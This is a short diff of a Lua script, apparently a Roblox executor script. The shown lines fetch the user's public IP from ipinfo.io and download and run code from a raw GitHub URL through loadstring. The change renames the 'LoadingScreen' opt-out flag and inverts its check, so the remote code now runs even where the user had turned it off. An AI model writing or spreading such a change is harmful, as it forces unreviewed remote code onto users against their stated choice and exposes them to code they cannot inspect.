@@ -213,7 +213,7 @@ local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local data1
 
 -- Loading Screen
-if _G.LoadingScreen ~= false then
+if _G.LoadingScreenz ~= true then
 loadstring(game:HttpGet('https://raw.githubusercontent.com/PSXS/ez/main/ez'))()
 end
 
